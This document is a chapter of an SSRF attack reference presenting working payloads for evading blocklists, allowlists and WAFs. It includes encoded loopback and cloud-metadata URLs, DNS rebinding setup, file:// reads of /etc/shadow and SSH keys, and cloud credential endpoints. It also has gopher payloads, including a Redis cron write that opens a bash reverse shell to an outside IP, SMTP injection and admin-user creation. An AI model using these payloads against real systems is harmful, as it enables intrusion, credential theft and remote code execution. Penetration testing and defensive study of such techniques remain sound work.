# 03 — Bypass & Evasion Encyclopedia

## 3.1 IP Address Encoding Bypasses

All of these resolve to `127.0.0.1` or `localhost`. Use them when string-based blocklists block the literal IP.

### Decimal / Dword (Integer)
```
# 127.0.0.1 → single 32-bit integer
http://2130706433/
http://2130706433:80/admin
http://2130706433/latest/meta-data/

# 169.254.169.254 (AWS metadata) → Dword
http://2852039166/
http://2852039166/latest/meta-data/iam/security-credentials/

# Calculate: python3 -c "import struct,socket; print(struct.unpack('!I', socket.inet_aton('127.0.0.1'))[0])"
```

### Hex Encoding
```
# 127.0.0.1
http://0x7f000001/
http://0x7f.0x0.0x0.0x1/
http://0x7f.0x00.0x00.0x01/

# 169.254.169.254
http://0xa9fea9fe/
http://0xa9.0xfe.0xa9.0xfe/
```

### Octal Encoding
```
# 127.0.0.1
http://0177.0.0.01/
http://0177.00.00.01/
http://0177.0.0.0x1/   # Mixed hex/octal

# 169.254.169.254
http://0251.0376.0251.0376/
```

### Mixed Encoding (Octal/Hex/Decimal combined)
```
http://0177.0x0.0.1/
http://127.0.0.0x01/
http://127.0.0.00000001/   # Leading zeros
http://0x7f.0.0.1/
```

### IPv6 Representations of IPv4
```
http://[::1]/               ← IPv6 loopback
http://[0:0:0:0:0:0:0:1]/
http://[::ffff:127.0.0.1]/
http://[::ffff:7f00:1]/
http://[0000:0000:0000:0000:0000:ffff:127.0.0.1]/

# AWS metadata in IPv6
http://[::ffff:169.254.169.254]/
http://[::ffff:a9fe:a9fe]/

# IPv6 to Decimal
http://[0:0:0:0:0:ffff:7f00:0001]/
```

### Shortened / Compressed Dotted Notation
```
http://127.1/              ← Resolves to 127.0.0.1 on Linux
http://127.0.1/            ← Also valid
http://127.127.127.127/    ← Loopback range (127.0.0.0/8)
http://127.0.0.254/        ← Still loopback
http://0/                  ← Resolves to 0.0.0.0 on some systems
http://0.0.0.0/
http://0000/               ← Some parsers → 0.0.0.0

# Useful shortcuts
http://127.1/latest/meta-data/  ← If "127.0.0.1" is blocklisted literally
```

---

## 3.2 URL Encoding & Parser Confusion Bypasses

### URL Encoding
```
# Encode the entire IP
http://%31%32%37%2e%30%2e%30%2e%31/
http://%31%32%37%2e%30%2e%30%2e%31/admin

# Double URL encode
http://%2531%2532%2537%252e%2530%252e%2530%252e%2531/

# Null byte injection
http://127.0.0.1%00.attacker.com/
http://127.0.0.1%00@attacker.com/

# Tab/newline injection
http://127.0.0.1%09/
http://127.0.0.1%0a/
http://127.0.0.1%0d/
```

### Unicode / Internationalized Domain Names
```
# Some URL parsers handle Unicode differently
http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/        ← Circled Unicode chars
http://①②⑦.①/              ← Circled number 1,2,7
http://𝟏𝟐𝟕.𝟎.𝟎.𝟏/           ← Mathematical bold digits

# IDNA encoding
http://localhost.%E3%82%B3%E3%83%A0/   ← Punycode tricks
```

### URL Parser Confusion (RFC-Inconsistent Parsing)
```
# Authority component parsing ambiguity
http://foo@127.0.0.1/           ← Some parsers see host as attacker.com if reversed
http://127.0.0.1@attacker.com/  ← Parser A: host = attacker.com; Parser B: host = 127.0.0.1
http://attacker.com@127.0.0.1/  ← `username = attacker.com`, host = 127.0.0.1

# Fragment confusion
http://attacker.com#@127.0.0.1/
http://attacker.com?q=1@127.0.0.1/

# Path confusion
http://attacker.com/./127.0.0.1/
http://attacker.com/../127.0.0.1/

# Scheme with whitespace
http: //127.0.0.1/      ← Some parsers strip space
 http://127.0.0.1/      ← Leading whitespace

# Multiple @
http://attacker.com:password@target.com@127.0.0.1/
```

---

## 3.3 DNS-Based Bypasses

### Public Wildcard DNS Services (Always Available)
```
# These domains' wildcard DNS A records resolve to 127.0.0.1
http://localtest.me/
http://customer1.app.localtest.me/
http://spoofed.burpcollaborator.net/  ← Burp Collaborator controlled
http://127.0.0.1.nip.io/
http://127.0.0.1.xip.io/            ← May be down, use nip.io
http://www.0x7f000001.xip.io/
http://127.0.0.1.sslip.io/

# AWS metadata via nip.io
http://169.254.169.254.nip.io/latest/meta-data/

# Your own domain DNS record
# Add A record: ssrf.yourdomain.com → 127.0.0.1
http://ssrf.yourdomain.com/
```

### DNS Rebinding Attack
A two-phase attack that bypasses allowlists requiring FQDN resolution to a "safe" IP:

```
Phase 1 (Validation): DNS resolves ssrf.attacker.com → 1.2.3.4 (attacker's real IP, passes check)
Phase 2 (Fetch):      DNS resolves ssrf.attacker.com → 127.0.0.1 (TTL expired, rebinding kicks in)

Setup:
1. Register ssrf.yourdomain.com with 0-second TTL
2. First DNS query → serve 1.2.3.4 (allowed by blocklist)
3. Application validates, then starts fetch
4. Second DNS query (TTL=0) → serve 127.0.0.1
5. Application fetches from 127.0.0.1

Tools: 
- https://github.com/brannondorsey/whonow  ← DNS rebinding server
- https://lock.cmpxchg8b.com/rebinder.html ← Web-based rebinding
- https://github.com/taviso/rbndr           ← Simple rebinding DNS
```

### CNAME Chain Abuse
```
# Create CNAME chain ending at 127.0.0.1
attacker.com CNAME → internal.attacker2.com CNAME → 127.0.0.1.nip.io
# Some validators only check the first CNAME
```

---

## 3.4 Allowlist Bypass Techniques

When the server requires a URL to match a trusted domain pattern:

### Open Redirect on Trusted Domain
```
# If trusted domain has open redirect:
GET /redirect?url=http://attacker.com → 302 → http://attacker.com

# Chain with SSRF:
http://trusted.example.com/redirect?url=http://169.254.169.254/latest/meta-data/

# Common open redirect params on trusted domains:
?url= ?redirect= ?next= ?return= ?returnUrl= ?goto= ?continue= ?location=
?ref= ?back= ?forward= ?destination= ?redirectUrl= ?returnTo=
```

### Subdomain of Trusted Domain
```
# If allowlist matches *.trusted.com:
# Register: evil.trusted.com (if you control trusted.com)
# Or find subdomain takeover on trusted.com

# If allowlist matches trusted.com (substring check):
http://evil-trusted.com/             ← Contains "trusted.com" as substring
http://trusted.com.attacker.com/    ← Ends with "trusted.com" sort of
http://attacker.com/trusted.com/    ← Path contains trusted.com
```

### URL Parameter Smuggling
```
# If allowlist checks only the domain part:
http://allowed.com.attacker.com/
http://allowed.com@attacker.com/
http://allowed.com/..%2F..%2F169.254.169.254/
http://allowed.com/redirect?url=http://169.254.169.254/

# URL with port (if allowlist doesn't check port)
http://allowed.com:@169.254.169.254/
```

### Path Traversal in URL
```
http://allowed.com/../../../169.254.169.254/latest/meta-data/
http://allowed.com/..;/169.254.169.254/
```

---

## 3.5 Alternative Scheme / Protocol Bypasses

When `http://` and `https://` are filtered, try other URL schemes:

### `file://` — Local File Read
```
file:///etc/passwd
file:///etc/shadow
file:///proc/self/environ    ← Environment variables
file:///proc/self/cmdline    ← Process command line
file:///proc/net/tcp         ← Open TCP connections
file:///proc/net/fib_trie    ← Internal IP addresses
file:///var/www/html/config.php
file:///app/config/database.yml
file:///root/.ssh/id_rsa
file://C:/Windows/win.ini    ← Windows targets
file://C:/inetpub/wwwroot/web.config
```

### `dict://` — Dictionary Protocol (TCP probing)
```
dict://127.0.0.1:6379/INFO   ← Redis info dump
dict://127.0.0.1:11211/stats ← Memcached stats
```

### `gopher://` — The SSRF Swiss Army Knife
Gopher can send arbitrary TCP data to any port, enabling interaction with non-HTTP services:

```
# Basic gopher format:
# gopher://HOST:PORT/_DATA
# DATA is URL-encoded, first char after _ is the first byte

# Redis exploit (write cron job for reverse shell)
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2456%0D%0A%0A%0A%2F%2A%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F1.2.3.4%2F4444%200%3E%261%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2411%0D%0A%2Fvar%2Fspool%2Fcron%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A

# Memcached flush
gopher://127.0.0.1:11211/_%0D%0Aflush_all%0D%0A

# SMTP email injection via gopher
gopher://127.0.0.1:25/_EHLO%20attacker%0D%0AMAIL%20FROM%3A%3Cattacker%40evil.com%3E%0D%0ARCPT%20TO%3A%3Cvictim%40example.com%3E%0D%0ADATA%0D%0ASubject%3A%20SSRF%20Test%0D%0A%0D%0AThis%20email%20was%20sent%20via%20SSRF%0D%0A.%0D%0AQUIT%0D%0A

# HTTP POST via gopher (useful when only gopher:// is allowed)
gopher://127.0.0.1:80/_POST%20/admin/create_user%20HTTP/1.1%0D%0AHost:%20localhost%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0AContent-Length:%2027%0D%0A%0D%0Ausername=hacker&admin=true

# Gopher tool: https://github.com/tarunkant/Gopherus
# Generate gopher payloads: python3 gopherus.py --exploit redis
```

### `ldap://` / `ldaps://`
```
ldap://127.0.0.1:389/
ldaps://127.0.0.1:636/
# If LDAP is running internally, can enumerate or trigger auth
```

### `tftp://`
```
tftp://YOUR.SERVER:69/exfil   ← Exfiltrate via TFTP on some systems
```

### `jar://` (Java-specific)
```
jar:http://YOUR.SERVER:8080/evil.jar!/
# Triggers HTTP request to download JAR in Java applications
```

### `netdoc://` (Java-specific)
```
netdoc://169.254.169.254/latest/meta-data/
# Java alternate for file:// in some versions
```

---

## 3.6 WAF / Security Filter Bypasses

### Case Sensitivity
```
HTTP://127.0.0.1/
Http://127.0.0.1/
hTTP://127.0.0.1/
HTTPS://127.0.0.1/
```

### Scheme Repetition / Confusion
```
http://http://127.0.0.1/      ← Some parsers strip first scheme
https://http://127.0.0.1/
http:////127.0.0.1/           ← Extra slashes
http:/\127.0.0.1/             ← Backslash (Windows-style)
http:\/\/127.0.0.1/           ← Mixed slashes
///127.0.0.1/                 ← Protocol-relative
```

### Port-Based Evasion
```
http://169.254.169.254:80/
http://169.254.169.254:8080/
http://169.254.169.254:443/  ← HTTPS port on HTTP URL
# If blocklist doesn't include port numbers
```

### DNS Wildcard Services for Filter Bypass
```
# Blocklist checks for "169.254.169.254"?
# Use DNS that resolves to it:
http://169.254.169.254.nip.io/

# Blocklist checks for "127.0.0.1"?
http://127.0.0.1.nip.io/
http://localtest.me/
```

### HTTP Request Smuggling → SSRF
```
# In some cases, HTTP request smuggling can be chained to 
# reach internal endpoints that SSRF filters would block

POST / HTTP/1.1
Host: target.com
Content-Length: 67
Transfer-Encoding: chunked

0

GET http://internal.service/admin HTTP/1.1
Host: internal.service
```

### IPv6 Zone ID Abuse
```
http://[::1%2500eth0]/     ← URL-encoded % in IPv6 zone ID
http://[::1%25eth0]/
```

### Newline / Space Injection
```
http://127.0.0.1 .attacker.com/   ← Space before dot
http://127.0.0.1%20/              ← URL-encoded space
http://127.0.0.1%09/              ← Tab character
http://127.0.0.1%0a/              ← Newline (LF)
http://127.0.0.1%0d/              ← Carriage return (CR)
```

---

## 3.7 Cloud Metadata Endpoint Variations

### AWS (IMDSv1 — no auth required)
```
http://169.254.169.254/
http://169.254.169.254/latest/
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/iam/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data/          ← User data scripts (may contain secrets)
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/public-ipv4
http://169.254.169.254/latest/meta-data/local-ipv4
```

### AWS (IMDSv2 — Requires PUT token first, but workarounds exist)
```
# Step 1: Get token (requires PUT with TTL header)
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

# Step 2: Use token
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
X-aws-ec2-metadata-token: TOKEN_FROM_STEP_1

# IMDSv2 bypass via SSRF: if app follows redirects and allows PUT method
# or if the SSRF vector supports custom headers
```

### GCP (Google Cloud)
```
http://metadata.google.internal/
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1beta1/  ← Old API, no header required!
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token

# Header required for v1: Metadata-Flavor: Google
# SSRF bypass: if you can set custom headers, or use v1beta1
```

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
http://169.254.169.254/metadata/instance/network?api-version=2021-02-01

# Header required: Metadata: true
# SSRF bypass: if you control headers, or find endpoint that doesn't check
```

### DigitalOcean
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/interfaces/
```

### Kubernetes
```
https://kubernetes.default.svc/
https://kubernetes.default.svc.cluster.local/
https://kubernetes.default/api/v1/namespaces/default/secrets
https://kubernetes.default/api/v1/pods
https://kubernetes.default/api/v1/serviceaccounts

# Service account token location
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/namespace
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Kubernetes API via curl (from within cluster)
# curl -sk https://kubernetes.default.svc/api/v1/secrets \
#   -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
```

### Alibaba Cloud
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

### Oracle Cloud
```
http://169.254.169.254/opc/v1/instance/
http://169.254.169.254/opc/v2/instance/
```

---

## 3.8 Application-Layer Bypass Techniques

### SSRF via HTTP Response Redirect Chain
```
# Host a PHP redirect on attacker server:
<?php
header("Location: http://169.254.169.254/latest/meta-data/");
exit;
?>

# Or redirect via JavaScript meta refresh (if server renders HTML):
<meta http-equiv="refresh" content="0;url=http://169.254.169.254/latest/meta-data/">
<script>window.location="http://169.254.169.254/latest/meta-data/"</script>

# Most HTTP clients follow redirects — blocklist checked on initial URL, 
# not on the 302 destination
```

### Rate Limiting / Timing Race Condition (TOCTOU)
```
# TOCTOU: Time-of-check vs Time-of-use
# 1. Submit valid URL (e.g., http://attacker.com) — passes blocklist check
# 2. Between validation and fetch, DNS resolves to 127.0.0.1 (rebinding)
# 3. Server fetches from 127.0.0.1

# Automate with:
while true; do
  dig ssrf.attacker.com  # toggle DNS between valid IP and 127.0.0.1
done &
# Submit requests rapidly alongside DNS toggling
```

### Chunked Transfer Encoding Tricks
```
# Some validation logic doesn't reconstruct chunked request bodies properly
POST /api/fetch HTTP/1.1
Transfer-Encoding: chunked

5
url=h
6
ttp://
9
127.0.0.
1
1
4
/adm
2
in
0

```

### Content-Type Confusion
```
# WAF may only inspect application/json, try other content types
Content-Type: text/plain
Content-Type: application/xml
Content-Type: application/x-www-form-urlencoded
Content-Type: multipart/form-data

# JSON → form-urlencoded bypass
Original: {"url": "http://127.0.0.1/"}
Bypass:  url=http://127.0.0.1/
```
